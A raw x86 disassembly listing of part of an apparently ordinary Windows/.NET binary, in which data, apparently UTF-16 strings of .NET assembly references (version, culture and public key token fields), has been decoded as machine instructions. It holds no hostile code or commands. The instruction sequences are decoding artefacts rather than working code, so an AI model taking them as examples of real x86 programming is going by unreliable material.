  405ed5:	add    BYTE PTR [eax+eax*1+0x79],dh
  405ed9:	add    BYTE PTR [esi],ch
  405edb:	add    BYTE PTR [eax+eax*1+0x65],al
  405edf:	add    BYTE PTR [ebx+0x0],dh
  405ee2:	imul   eax,DWORD PTR [eax],0x6e0067
  405ee8:	sub    al,0x0
  405eea:	and    BYTE PTR [eax],al
  405eec:	push   esi
  405eed:	add    BYTE PTR [ebp+0x0],ah
  405ef0:	jb     0x405ef2
  405ef2:	jae    0x405ef4
  405ef4:	imul   eax,DWORD PTR [eax],0x6e006f
  405efa:	cmp    eax,0x2e003400
  405eff:	add    BYTE PTR [eax],dh
  405f01:	add    BYTE PTR [esi],ch
  405f03:	add    BYTE PTR [eax],dh
  405f05:	add    BYTE PTR [esi],ch
  405f07:	add    BYTE PTR [eax],dh
  405f09:	add    BYTE PTR [eax+eax*1],ch
  405f0c:	and    BYTE PTR [eax],al
  405f0e:	inc    ebx
  405f0f:	add    BYTE PTR [ebp+0x0],dh
  405f12:	ins    BYTE PTR es:[edi],dx
  405f13:	add    BYTE PTR [eax+eax*1+0x75],dh
  405f17:	add    BYTE PTR [edx+0x0],dh
  405f1a:	add    BYTE PTR gs:0x65006e00,bh
  405f21:	add    BYTE PTR [ebp+0x0],dh
  405f24:	je     0x405f26
  405f26:	jb     0x405f28
  405f28:	popa   
  405f29:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405f2d:	add    BYTE PTR [eax],ah
  405f2f:	add    BYTE PTR [eax+0x0],dl
  405f32:	jne    0x405f34
  405f34:	bound  eax,QWORD PTR [eax]
  405f36:	ins    BYTE PTR es:[edi],dx
  405f37:	add    BYTE PTR [ecx+0x0],ch
  405f3a:	arpl   WORD PTR [eax],ax
  405f3c:	dec    ebx
  405f3d:	add    BYTE PTR [ebp+0x0],ah
  405f40:	jns    0x405f42
  405f42:	push   esp
  405f43:	add    BYTE PTR [edi+0x0],ch
  405f46:	imul   eax,DWORD PTR [eax],0x65
  405f49:	add    BYTE PTR [esi+0x0],ch
  405f4c:	cmp    eax,0x37006200
  405f51:	add    BYTE PTR [edi],dh
  405f53:	add    BYTE PTR [ecx+0x0],ah
  405f56:	xor    eax,0x35006300
  405f5b:	add    BYTE PTR [esi],dh
  405f5d:	add    BYTE PTR [ecx],dh
  405f5f:	add    BYTE PTR [ecx],bh
  405f61:	add    BYTE PTR [ebx],dh
  405f63:	add    BYTE PTR [eax+eax*1],dh
  405f66:	add    BYTE PTR gs:[eax],dh
  405f69:	add    BYTE PTR [eax],bh
  405f6b:	add    BYTE PTR [ecx],bh
  405f6d:	add    BYTE PTR [eax+0x790053b0],al
  405f73:	add    BYTE PTR [ebx+0x0],dh
  405f76:	je     0x405f78
  405f78:	add    BYTE PTR gs:[ebp+0x0],ch
  405f7c:	add    BYTE PTR cs:[edi+0x0],dl
  405f80:	add    BYTE PTR gs:[edx+0x0],ah
  405f84:	add    BYTE PTR cs:[ebp+0x0],al
  405f88:	js     0x405f8a
  405f8a:	je     0x405f8c
  405f8c:	add    BYTE PTR gs:[esi+0x0],ch
  405f90:	jae    0x405f92
  405f92:	imul   eax,DWORD PTR [eax],0x6e006f
  405f98:	jae    0x405f9a
  405f9a:	sub    al,0x0
  405f9c:	and    BYTE PTR [eax],al
  405f9e:	push   esi
  405f9f:	add    BYTE PTR [ebp+0x0],ah
  405fa2:	jb     0x405fa4
  405fa4:	jae    0x405fa6
  405fa6:	imul   eax,DWORD PTR [eax],0x6e006f
  405fac:	cmp    eax,0x2e003400
  405fb1:	add    BYTE PTR [eax],dh
  405fb3:	add    BYTE PTR [esi],ch
  405fb5:	add    BYTE PTR [eax],dh
  405fb7:	add    BYTE PTR [esi],ch
  405fb9:	add    BYTE PTR [eax],dh
  405fbb:	add    BYTE PTR [eax+eax*1],ch
  405fbe:	and    BYTE PTR [eax],al
  405fc0:	inc    ebx
  405fc1:	add    BYTE PTR [ebp+0x0],dh
  405fc4:	ins    BYTE PTR es:[edi],dx
  405fc5:	add    BYTE PTR [eax+eax*1+0x75],dh
  405fc9:	add    BYTE PTR [edx+0x0],dh
  405fcc:	add    BYTE PTR gs:0x65006e00,bh
  405fd3:	add    BYTE PTR [ebp+0x0],dh
  405fd6:	je     0x405fd8
  405fd8:	jb     0x405fda
  405fda:	popa   
  405fdb:	add    BYTE PTR [eax+eax*1+0x2c],ch
  405fdf:	add    BYTE PTR [eax],ah
  405fe1:	add    BYTE PTR [eax+0x0],dl
  405fe4:	jne    0x405fe6
  405fe6:	bound  eax,QWORD PTR [eax]
  405fe8:	ins    BYTE PTR es:[edi],dx
  405fe9:	add    BYTE PTR [ecx+0x0],ch
  405fec:	arpl   WORD PTR [eax],ax
  405fee:	dec    ebx
  405fef:	add    BYTE PTR [ebp+0x0],ah
  405ff2:	jns    0x405ff4
  405ff4:	push   esp
  405ff5:	add    BYTE PTR [edi+0x0],ch
  405ff8:	imul   eax,DWORD PTR [eax],0x65
  405ffb:	add    BYTE PTR [esi+0x0],ch
  405ffe:	cmp    eax,0x31003300
  406003:	add    BYTE PTR [edx+0x0],ah
  406006:	data16 add BYTE PTR [ebx],dh
  406009:	add    BYTE PTR [eax],bh
  40600b:	add    BYTE PTR ds:0x61003600,dh
  406011:	add    BYTE PTR [eax+eax*1+0x33],ah
  406015:	add    BYTE PTR [esi],dh
  406017:	add    BYTE PTR [eax+eax*1],dh
  40601a:	add    BYTE PTR gs:[ebx],dh
  40601d:	add    BYTE PTR ds:0x53be8000,dh
  406023:	add    BYTE PTR [ecx+0x0],bh
  406026:	jae    0x406028
  406028:	je     0x40602a
  40602a:	add    BYTE PTR gs:[ebp+0x0],ch
  40602e:	add    BYTE PTR cs:[edi+0x0],dl
  406032:	add    BYTE PTR gs:[edx+0x0],ah
  406036:	add    BYTE PTR cs:[ebp+0x0],al
  40603a:	js     0x40603c
  40603c:	je     0x40603e
  40603e:	add    BYTE PTR gs:[esi+0x0],ch
  406042:	jae    0x406044
  406044:	imul   eax,DWORD PTR [eax],0x6e006f
  40604a:	jae    0x40604c
  40604c:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  406051:	add    BYTE PTR [ebx+0x0],dh
  406054:	imul   eax,DWORD PTR [eax],0x6e0067
  40605a:	sub    al,0x0
  40605c:	and    BYTE PTR [eax],al
  40605e:	push   esi
  40605f:	add    BYTE PTR [ebp+0x0],ah
  406062:	jb     0x406064
  406064:	jae    0x406066
  406066:	imul   eax,DWORD PTR [eax],0x6e006f
  40606c:	cmp    eax,0x2e003400
  406071:	add    BYTE PTR [eax],dh
  406073:	add    BYTE PTR [esi],ch
  406075:	add    BYTE PTR [eax],dh
  406077:	add    BYTE PTR [esi],ch
  406079:	add    BYTE PTR [eax],dh
  40607b:	add    BYTE PTR [eax+eax*1],ch
  40607e:	and    BYTE PTR [eax],al
  406080:	inc    ebx
  406081:	add    BYTE PTR [ebp+0x0],dh
  406084:	ins    BYTE PTR es:[edi],dx
  406085:	add    BYTE PTR [eax+eax*1+0x75],dh
  406089:	add    BYTE PTR [edx+0x0],dh
  40608c:	add    BYTE PTR gs:0x65006e00,bh
  406093:	add    BYTE PTR [ebp+0x0],dh
  406096:	je     0x406098
  406098:	jb     0x40609a
  40609a:	popa   
  40609b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40609f:	add    BYTE PTR [eax],ah
  4060a1:	add    BYTE PTR [eax+0x0],dl
  4060a4:	jne    0x4060a6
  4060a6:	bound  eax,QWORD PTR [eax]
  4060a8:	ins    BYTE PTR es:[edi],dx
  4060a9:	add    BYTE PTR [ecx+0x0],ch
  4060ac:	arpl   WORD PTR [eax],ax
  4060ae:	dec    ebx
  4060af:	add    BYTE PTR [ebp+0x0],ah
  4060b2:	jns    0x4060b4
  4060b4:	push   esp
  4060b5:	add    BYTE PTR [edi+0x0],ch
  4060b8:	imul   eax,DWORD PTR [eax],0x65
  4060bb:	add    BYTE PTR [esi+0x0],ch
  4060be:	cmp    eax,0x31003300
  4060c3:	add    BYTE PTR [edx+0x0],ah
  4060c6:	data16 add BYTE PTR [ebx],dh
  4060c9:	add    BYTE PTR [eax],bh
  4060cb:	add    BYTE PTR ds:0x61003600,dh
  4060d1:	add    BYTE PTR [eax+eax*1+0x33],ah
  4060d5:	add    BYTE PTR [esi],dh
  4060d7:	add    BYTE PTR [eax+eax*1],dh
  4060da:	add    BYTE PTR gs:[ebx],dh
  4060dd:	add    BYTE PTR ds:0x53a88000,dh
  4060e3:	add    BYTE PTR [ecx+0x0],bh
  4060e6:	jae    0x4060e8
  4060e8:	je     0x4060ea
  4060ea:	add    BYTE PTR gs:[ebp+0x0],ch
  4060ee:	add    BYTE PTR cs:[edi+0x0],dl
  4060f2:	add    BYTE PTR gs:[edx+0x0],ah
  4060f6:	add    BYTE PTR cs:[ebp+0x0],cl
  4060fa:	outs   dx,DWORD PTR ds:[esi]
  4060fb:	add    BYTE PTR [edx+0x0],ah
  4060fe:	imul   eax,DWORD PTR [eax],0x65006c
  406104:	sub    al,0x0
  406106:	and    BYTE PTR [eax],al
  406108:	push   esi
  406109:	add    BYTE PTR [ebp+0x0],ah
  40610c:	jb     0x40610e
  40610e:	jae    0x406110
  406110:	imul   eax,DWORD PTR [eax],0x6e006f
  406116:	cmp    eax,0x2e003400
  40611b:	add    BYTE PTR [eax],dh
  40611d:	add    BYTE PTR [esi],ch
  40611f:	add    BYTE PTR [eax],dh
  406121:	add    BYTE PTR [esi],ch
  406123:	add    BYTE PTR [eax],dh
  406125:	add    BYTE PTR [eax+eax*1],ch
  406128:	and    BYTE PTR [eax],al
  40612a:	inc    ebx
  40612b:	add    BYTE PTR [ebp+0x0],dh
  40612e:	ins    BYTE PTR es:[edi],dx
  40612f:	add    BYTE PTR [eax+eax*1+0x75],dh
  406133:	add    BYTE PTR [edx+0x0],dh
  406136:	add    BYTE PTR gs:0x65006e00,bh
  40613d:	add    BYTE PTR [ebp+0x0],dh
  406140:	je     0x406142
  406142:	jb     0x406144
  406144:	popa   
  406145:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406149:	add    BYTE PTR [eax],ah
  40614b:	add    BYTE PTR [eax+0x0],dl
  40614e:	jne    0x406150
  406150:	bound  eax,QWORD PTR [eax]
  406152:	ins    BYTE PTR es:[edi],dx
  406153:	add    BYTE PTR [ecx+0x0],ch
  406156:	arpl   WORD PTR [eax],ax
  406158:	dec    ebx
  406159:	add    BYTE PTR [ebp+0x0],ah
  40615c:	jns    0x40615e
  40615e:	push   esp
  40615f:	add    BYTE PTR [edi+0x0],ch
  406162:	imul   eax,DWORD PTR [eax],0x65
  406165:	add    BYTE PTR [esi+0x0],ch
  406168:	cmp    eax,0x30006200
  40616d:	add    BYTE PTR [ebx],dh
  40616f:	add    BYTE PTR [esi+0x0],ah
  406172:	xor    eax,0x37006600
  406177:	add    BYTE PTR [esi+0x0],ah
  40617a:	xor    DWORD PTR [eax],eax
  40617c:	xor    DWORD PTR [eax],eax
  40617e:	add    BYTE PTR fs:0x61003000,dh
  406185:	add    BYTE PTR [ebx],dh
  406187:	add    BYTE PTR [ecx+0x0],ah
  40618a:	add    al,0x53
  40618d:	add    BYTE PTR [ecx+0x0],bh
  406190:	jae    0x406192
  406192:	je     0x406194
  406194:	add    BYTE PTR gs:[ebp+0x0],ch
  406198:	add    BYTE PTR cs:[edi+0x0],dl
  40619c:	add    BYTE PTR gs:[edx+0x0],ah
  4061a0:	add    BYTE PTR cs:[edx+0x0],dl
  4061a4:	add    BYTE PTR gs:[edi+0x0],ah
  4061a8:	jne    0x4061aa
  4061aa:	ins    BYTE PTR es:[edi],dx
  4061ab:	add    BYTE PTR [ecx+0x0],ah
  4061ae:	jb     0x4061b0
  4061b0:	inc    ebp
  4061b1:	add    BYTE PTR [eax+0x0],bh
  4061b4:	jo     0x4061b6
  4061b6:	jb     0x4061b8
  4061b8:	add    BYTE PTR gs:[ebx+0x0],dh
  4061bc:	jae    0x4061be
  4061be:	imul   eax,DWORD PTR [eax],0x6e006f
  4061c4:	jae    0x4061c6
  4061c6:	sub    al,0x0
  4061c8:	and    BYTE PTR [eax],al
  4061ca:	push   esi
  4061cb:	add    BYTE PTR [ebp+0x0],ah
  4061ce:	jb     0x4061d0
  4061d0:	jae    0x4061d2
  4061d2:	imul   eax,DWORD PTR [eax],0x6e006f
  4061d8:	cmp    eax,0x2e003400
  4061dd:	add    BYTE PTR [eax],dh
  4061df:	add    BYTE PTR [esi],ch
  4061e1:	add    BYTE PTR [eax],dh
  4061e3:	add    BYTE PTR [esi],ch
  4061e5:	add    BYTE PTR [eax],dh
  4061e7:	add    BYTE PTR [eax+eax*1],ch
  4061ea:	and    BYTE PTR [eax],al
  4061ec:	inc    ebx
  4061ed:	add    BYTE PTR [ebp+0x0],dh
  4061f0:	ins    BYTE PTR es:[edi],dx
  4061f1:	add    BYTE PTR [eax+eax*1+0x75],dh
  4061f5:	add    BYTE PTR [edx+0x0],dh
  4061f8:	add    BYTE PTR gs:0x65006e00,bh
  4061ff:	add    BYTE PTR [ebp+0x0],dh
  406202:	je     0x406204
  406204:	jb     0x406206
  406206:	popa   
  406207:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40620b:	add    BYTE PTR [eax],ah
  40620d:	add    BYTE PTR [eax+0x0],dl
  406210:	jne    0x406212
  406212:	bound  eax,QWORD PTR [eax]
  406214:	ins    BYTE PTR es:[edi],dx
  406215:	add    BYTE PTR [ecx+0x0],ch
  406218:	arpl   WORD PTR [eax],ax
  40621a:	dec    ebx
  40621b:	add    BYTE PTR [ebp+0x0],ah
  40621e:	jns    0x406220
  406220:	push   esp
  406221:	add    BYTE PTR [edi+0x0],ch
  406224:	imul   eax,DWORD PTR [eax],0x65
  406227:	add    BYTE PTR [esi+0x0],ch
  40622a:	cmp    eax,0x30006200
  40622f:	add    BYTE PTR [ebx],dh
  406231:	add    BYTE PTR [esi+0x0],ah
  406234:	xor    eax,0x37006600
  406239:	add    BYTE PTR [esi+0x0],ah
  40623c:	xor    DWORD PTR [eax],eax
  40623e:	xor    DWORD PTR [eax],eax
  406240:	add    BYTE PTR fs:0x61003000,dh
  406247:	add    BYTE PTR [ebx],dh
  406249:	add    BYTE PTR [ecx+0x0],ah
  40624c:	sub    BYTE PTR [edx+0x790053],0x73
  406253:	add    BYTE PTR [eax+eax*1+0x65],dh
  406257:	add    BYTE PTR [ebp+0x0],ch
  40625a:	add    BYTE PTR cs:[edi+0x0],dl
  40625e:	add    BYTE PTR gs:[edx+0x0],ah
  406262:	add    BYTE PTR cs:[edx+0x0],dl
  406266:	outs   dx,DWORD PTR ds:[esi]
  406267:	add    BYTE PTR [ebp+0x0],dh
  40626a:	je     0x40626c
  40626c:	imul   eax,DWORD PTR [eax],0x67006e
  406272:	sub    al,0x0
  406274:	and    BYTE PTR [eax],al
  406276:	push   esi
  406277:	add    BYTE PTR [ebp+0x0],ah
  40627a:	jb     0x40627c
  40627c:	jae    0x40627e
  40627e:	imul   eax,DWORD PTR [eax],0x6e006f
  406284:	cmp    eax,0x2e003400
  406289:	add    BYTE PTR [eax],dh
  40628b:	add    BYTE PTR [esi],ch
  40628d:	add    BYTE PTR [eax],dh
  40628f:	add    BYTE PTR [esi],ch
  406291:	add    BYTE PTR [eax],dh
  406293:	add    BYTE PTR [eax+eax*1],ch
  406296:	and    BYTE PTR [eax],al
  406298:	inc    ebx
  406299:	add    BYTE PTR [ebp+0x0],dh
  40629c:	ins    BYTE PTR es:[edi],dx
  40629d:	add    BYTE PTR [eax+eax*1+0x75],dh
  4062a1:	add    BYTE PTR [edx+0x0],dh
  4062a4:	add    BYTE PTR gs:0x65006e00,bh
  4062ab:	add    BYTE PTR [ebp+0x0],dh
  4062ae:	je     0x4062b0
  4062b0:	jb     0x4062b2
  4062b2:	popa   
  4062b3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4062b7:	add    BYTE PTR [eax],ah
  4062b9:	add    BYTE PTR [eax+0x0],dl
  4062bc:	jne    0x4062be
  4062be:	bound  eax,QWORD PTR [eax]
  4062c0:	ins    BYTE PTR es:[edi],dx
  4062c1:	add    BYTE PTR [ecx+0x0],ch
  4062c4:	arpl   WORD PTR [eax],ax
  4062c6:	dec    ebx
  4062c7:	add    BYTE PTR [ebp+0x0],ah
  4062ca:	jns    0x4062cc
  4062cc:	push   esp
  4062cd:	add    BYTE PTR [edi+0x0],ch
  4062d0:	imul   eax,DWORD PTR [eax],0x65
  4062d3:	add    BYTE PTR [esi+0x0],ch
  4062d6:	cmp    eax,0x31003300
  4062db:	add    BYTE PTR [edx+0x0],ah
  4062de:	data16 add BYTE PTR [ebx],dh
  4062e1:	add    BYTE PTR [eax],bh
  4062e3:	add    BYTE PTR ds:0x61003600,dh
  4062e9:	add    BYTE PTR [eax+eax*1+0x33],ah
  4062ed:	add    BYTE PTR [esi],dh
  4062ef:	add    BYTE PTR [eax+eax*1],dh
  4062f2:	add    BYTE PTR gs:[ebx],dh
  4062f5:	add    BYTE PTR ds:0x53ac8000,dh
  4062fb:	add    BYTE PTR [ecx+0x0],bh
  4062fe:	jae    0x406300
  406300:	je     0x406302
  406302:	add    BYTE PTR gs:[ebp+0x0],ch
  406306:	add    BYTE PTR cs:[edi+0x0],dl
  40630a:	add    BYTE PTR gs:[edx+0x0],ah
  40630e:	add    BYTE PTR cs:[ebx+0x0],dl
  406312:	add    BYTE PTR gs:[edx+0x0],dh
  406316:	jbe    0x406318
  406318:	imul   eax,DWORD PTR [eax],0x650063
  40631e:	jae    0x406320
  406320:	sub    al,0x0
  406322:	and    BYTE PTR [eax],al
  406324:	push   esi
  406325:	add    BYTE PTR [ebp+0x0],ah
  406328:	jb     0x40632a
  40632a:	jae    0x40632c
  40632c:	imul   eax,DWORD PTR [eax],0x6e006f
  406332:	cmp    eax,0x2e003400
  406337:	add    BYTE PTR [eax],dh
  406339:	add    BYTE PTR [esi],ch
  40633b:	add    BYTE PTR [eax],dh
  40633d:	add    BYTE PTR [esi],ch
  40633f:	add    BYTE PTR [eax],dh
  406341:	add    BYTE PTR [eax+eax*1],ch
  406344:	and    BYTE PTR [eax],al
  406346:	inc    ebx
  406347:	add    BYTE PTR [ebp+0x0],dh
  40634a:	ins    BYTE PTR es:[edi],dx
  40634b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40634f:	add    BYTE PTR [edx+0x0],dh
  406352:	add    BYTE PTR gs:0x65006e00,bh
  406359:	add    BYTE PTR [ebp+0x0],dh
  40635c:	je     0x40635e
  40635e:	jb     0x406360
  406360:	popa   
  406361:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406365:	add    BYTE PTR [eax],ah
  406367:	add    BYTE PTR [eax+0x0],dl
  40636a:	jne    0x40636c
  40636c:	bound  eax,QWORD PTR [eax]
  40636e:	ins    BYTE PTR es:[edi],dx
  40636f:	add    BYTE PTR [ecx+0x0],ch
  406372:	arpl   WORD PTR [eax],ax
  406374:	dec    ebx
  406375:	add    BYTE PTR [ebp+0x0],ah
  406378:	jns    0x40637a
  40637a:	push   esp
  40637b:	add    BYTE PTR [edi+0x0],ch
  40637e:	imul   eax,DWORD PTR [eax],0x65
  406381:	add    BYTE PTR [esi+0x0],ch
  406384:	cmp    eax,0x30006200
  406389:	add    BYTE PTR [ebx],dh
  40638b:	add    BYTE PTR [esi+0x0],ah
  40638e:	xor    eax,0x37006600
  406393:	add    BYTE PTR [esi+0x0],ah
  406396:	xor    DWORD PTR [eax],eax
  406398:	xor    DWORD PTR [eax],eax
  40639a:	add    BYTE PTR fs:0x61003000,dh
  4063a1:	add    BYTE PTR [ebx],dh
  4063a3:	add    BYTE PTR [ecx+0x0],ah
  4063a6:	sbb    BYTE PTR [edi+edx*2+0x6e006900],0x0
  4063ae:	add    BYTE PTR fs:[edi+0x0],ch
  4063b2:	ja     0x4063b4
  4063b4:	jae    0x4063b6
  4063b6:	inc    edx
  4063b7:	add    BYTE PTR [ecx+0x0],ah
  4063ba:	jae    0x4063bc
  4063bc:	add    BYTE PTR gs:[eax+eax*1],ch
  4063c0:	and    BYTE PTR [eax],al
  4063c2:	push   esi
  4063c3:	add    BYTE PTR [ebp+0x0],ah
  4063c6:	jb     0x4063c8
  4063c8:	jae    0x4063ca
  4063ca:	imul   eax,DWORD PTR [eax],0x6e006f
  4063d0:	cmp    eax,0x2e003400
  4063d5:	add    BYTE PTR [eax],dh
  4063d7:	add    BYTE PTR [esi],ch
  4063d9:	add    BYTE PTR [eax],dh
  4063db:	add    BYTE PTR [esi],ch
  4063dd:	add    BYTE PTR [eax],dh
  4063df:	add    BYTE PTR [eax+eax*1],ch
  4063e2:	and    BYTE PTR [eax],al
  4063e4:	inc    ebx
  4063e5:	add    BYTE PTR [ebp+0x0],dh
  4063e8:	ins    BYTE PTR es:[edi],dx
  4063e9:	add    BYTE PTR [eax+eax*1+0x75],dh
  4063ed:	add    BYTE PTR [edx+0x0],dh
  4063f0:	add    BYTE PTR gs:0x65006e00,bh
  4063f7:	add    BYTE PTR [ebp+0x0],dh
  4063fa:	je     0x4063fc
  4063fc:	jb     0x4063fe
  4063fe:	popa   
  4063ff:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406403:	add    BYTE PTR [eax],ah
  406405:	add    BYTE PTR [eax+0x0],dl
  406408:	jne    0x40640a
  40640a:	bound  eax,QWORD PTR [eax]
  40640c:	ins    BYTE PTR es:[edi],dx
  40640d:	add    BYTE PTR [ecx+0x0],ch
  406410:	arpl   WORD PTR [eax],ax
  406412:	dec    ebx
  406413:	add    BYTE PTR [ebp+0x0],ah
  406416:	jns    0x406418
  406418:	push   esp
  406419:	add    BYTE PTR [edi+0x0],ch
  40641c:	imul   eax,DWORD PTR [eax],0x65
  40641f:	add    BYTE PTR [esi+0x0],ch
  406422:	cmp    eax,0x31003300
  406427:	add    BYTE PTR [edx+0x0],ah
  40642a:	data16 add BYTE PTR [ebx],dh
  40642d:	add    BYTE PTR [eax],bh
  40642f:	add    BYTE PTR ds:0x61003600,dh
  406435:	add    BYTE PTR [eax+eax*1+0x33],ah
  406439:	add    BYTE PTR [esi],dh
  40643b:	add    BYTE PTR [eax+eax*1],dh
  40643e:	add    BYTE PTR gs:[ebx],dh
  406441:	add    BYTE PTR ds:0x4db28000,dh
  406447:	add    BYTE PTR [ecx+0x0],ch
  40644a:	arpl   WORD PTR [eax],ax
  40644c:	jb     0x40644e
  40644e:	outs   dx,DWORD PTR ds:[esi]
  40644f:	add    BYTE PTR [ebx+0x0],dh
  406452:	outs   dx,DWORD PTR ds:[esi]
  406453:	add    BYTE PTR [esi+0x0],ah
  406456:	je     0x406458
  406458:	add    BYTE PTR cs:[esi+0x0],dl
  40645c:	imul   eax,DWORD PTR [eax],0x750073
  406462:	popa   
  406463:	add    BYTE PTR [eax+eax*1+0x53],ch
  406467:	add    BYTE PTR [eax+eax*1+0x75],dh
  40646b:	add    BYTE PTR [eax+eax*1+0x69],ah
  40646f:	add    BYTE PTR [edi+0x0],ch
  406472:	sub    al,0x0
  406474:	and    BYTE PTR [eax],al
  406476:	push   esi
  406477:	add    BYTE PTR [ebp+0x0],ah
  40647a:	jb     0x40647c
  40647c:	jae    0x40647e
  40647e:	imul   eax,DWORD PTR [eax],0x6e006f
  406484:	cmp    eax,0x2e003400
  406489:	add    BYTE PTR [eax],dh
  40648b:	add    BYTE PTR [esi],ch
  40648d:	add    BYTE PTR [eax],dh
  40648f:	add    BYTE PTR [esi],ch
  406491:	add    BYTE PTR [eax],dh
  406493:	add    BYTE PTR [eax+eax*1],ch
  406496:	and    BYTE PTR [eax],al
  406498:	inc    ebx
  406499:	add    BYTE PTR [ebp+0x0],dh
  40649c:	ins    BYTE PTR es:[edi],dx
  40649d:	add    BYTE PTR [eax+eax*1+0x75],dh
  4064a1:	add    BYTE PTR [edx+0x0],dh
  4064a4:	add    BYTE PTR gs:0x65006e00,bh
  4064ab:	add    BYTE PTR [ebp+0x0],dh
  4064ae:	je     0x4064b0
  4064b0:	jb     0x4064b2
  4064b2:	popa   
  4064b3:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4064b7:	add    BYTE PTR [eax],ah
  4064b9:	add    BYTE PTR [eax+0x0],dl
  4064bc:	jne    0x4064be
  4064be:	bound  eax,QWORD PTR [eax]
  4064c0:	ins    BYTE PTR es:[edi],dx
  4064c1:	add    BYTE PTR [ecx+0x0],ch
  4064c4:	arpl   WORD PTR [eax],ax
  4064c6:	dec    ebx
  4064c7:	add    BYTE PTR [ebp+0x0],ah
  4064ca:	jns    0x4064cc
  4064cc:	push   esp
  4064cd:	add    BYTE PTR [edi+0x0],ch
  4064d0:	imul   eax,DWORD PTR [eax],0x65
  4064d3:	add    BYTE PTR [esi+0x0],ch
  4064d6:	cmp    eax,0x30006200
  4064db:	add    BYTE PTR [ebx],dh
  4064dd:	add    BYTE PTR [esi+0x0],ah
  4064e0:	xor    eax,0x37006600
  4064e5:	add    BYTE PTR [esi+0x0],ah
  4064e8:	xor    DWORD PTR [eax],eax
  4064ea:	xor    DWORD PTR [eax],eax
  4064ec:	add    BYTE PTR fs:0x61003000,dh
  4064f3:	add    BYTE PTR [ebx],dh
  4064f5:	add    BYTE PTR [ecx+0x0],ah
  4064f8:	or     dh,0x4d
  4064fb:	add    BYTE PTR [ecx+0x0],ch
  4064fe:	arpl   WORD PTR [eax],ax
  406500:	jb     0x406502
  406502:	outs   dx,DWORD PTR ds:[esi]
  406503:	add    BYTE PTR [ebx+0x0],dh
  406506:	outs   dx,DWORD PTR ds:[esi]
  406507:	add    BYTE PTR [esi+0x0],ah
  40650a:	je     0x40650c
  40650c:	add    BYTE PTR cs:[esi+0x0],dl
  406510:	imul   eax,DWORD PTR [eax],0x750073
  406516:	popa   
  406517:	add    BYTE PTR [eax+eax*1+0x53],ch
  40651b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40651f:	add    BYTE PTR [eax+eax*1+0x69],ah
  406523:	add    BYTE PTR [edi+0x0],ch
  406526:	add    BYTE PTR cs:[edi+0x0],dl
  40652a:	imul   eax,DWORD PTR [eax],0x64006e
  406530:	outs   dx,DWORD PTR ds:[esi]
  406531:	add    BYTE PTR [edi+0x0],dh
  406534:	jae    0x406536
  406536:	add    BYTE PTR cs:[esi+0x0],al
  40653a:	outs   dx,DWORD PTR ds:[esi]
  40653b:	add    BYTE PTR [edx+0x0],dh
  40653e:	ins    DWORD PTR es:[edi],dx
  40653f:	add    BYTE PTR [ebx+0x0],dh
  406542:	sub    al,0x0
  406544:	and    BYTE PTR [eax],al
  406546:	push   esi
  406547:	add    BYTE PTR [ebp+0x0],ah
  40654a:	jb     0x40654c
  40654c:	jae    0x40654e
  40654e:	imul   eax,DWORD PTR [eax],0x6e006f
  406554:	cmp    eax,0x2e003400
  406559:	add    BYTE PTR [eax],dh
  40655b:	add    BYTE PTR [esi],ch
  40655d:	add    BYTE PTR [eax],dh
  40655f:	add    BYTE PTR [esi],ch
  406561:	add    BYTE PTR [eax],dh
  406563:	add    BYTE PTR [eax+eax*1],ch
  406566:	and    BYTE PTR [eax],al
  406568:	inc    ebx
  406569:	add    BYTE PTR [ebp+0x0],dh
  40656c:	ins    BYTE PTR es:[edi],dx
  40656d:	add    BYTE PTR [eax+eax*1+0x75],dh
  406571:	add    BYTE PTR [edx+0x0],dh
  406574:	add    BYTE PTR gs:0x65006e00,bh
  40657b:	add    BYTE PTR [ebp+0x0],dh
  40657e:	je     0x406580
  406580:	jb     0x406582
  406582:	popa   
  406583:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406587:	add    BYTE PTR [eax],ah
  406589:	add    BYTE PTR [eax+0x0],dl
  40658c:	jne    0x40658e
  40658e:	bound  eax,QWORD PTR [eax]
  406590:	ins    BYTE PTR es:[edi],dx
  406591:	add    BYTE PTR [ecx+0x0],ch
  406594:	arpl   WORD PTR [eax],ax
  406596:	dec    ebx
  406597:	add    BYTE PTR [ebp+0x0],ah
  40659a:	jns    0x40659c
  40659c:	push   esp
  40659d:	add    BYTE PTR [edi+0x0],ch
  4065a0:	imul   eax,DWORD PTR [eax],0x65
  4065a3:	add    BYTE PTR [esi+0x0],ch
  4065a6:	cmp    eax,0x30006200
  4065ab:	add    BYTE PTR [ebx],dh
  4065ad:	add    BYTE PTR [esi+0x0],ah
  4065b0:	xor    eax,0x37006600
  4065b5:	add    BYTE PTR [esi+0x0],ah
  4065b8:	xor    DWORD PTR [eax],eax
  4065ba:	xor    DWORD PTR [eax],eax
  4065bc:	add    BYTE PTR fs:0x61003000,dh
  4065c3:	add    BYTE PTR [ebx],dh
  4065c5:	add    BYTE PTR [ecx+0x0],ah
  4065c8:	sub    BYTE PTR [esi+edx*2+0x53004a00],0x0
  4065d0:	push   0x72006100
  4065d5:	add    BYTE PTR [eax+0x0],dh
  4065d8:	inc    ebx
  4065d9:	add    BYTE PTR [edi+0x0],ch
  4065dc:	add    BYTE PTR fs:[ebp+0x0],ah
  4065e0:	push   eax
  4065e1:	add    BYTE PTR [edx+0x0],dh
  4065e4:	outs   dx,DWORD PTR ds:[esi]
  4065e5:	add    BYTE PTR [esi+0x0],dh
  4065e8:	imul   eax,DWORD PTR [eax],0x650064
  4065ee:	jb     0x4065f0
  4065f0:	sub    al,0x0
  4065f2:	and    BYTE PTR [eax],al
  4065f4:	push   esi
  4065f5:	add    BYTE PTR [ebp+0x0],ah
  4065f8:	jb     0x4065fa
  4065fa:	jae    0x4065fc
  4065fc:	imul   eax,DWORD PTR [eax],0x6e006f
  406602:	cmp    eax,0x2e003400
  406607:	add    BYTE PTR [eax],dh
  406609:	add    BYTE PTR [esi],ch
  40660b:	add    BYTE PTR [eax],dh
  40660d:	add    BYTE PTR [esi],ch
  40660f:	add    BYTE PTR [eax],dh
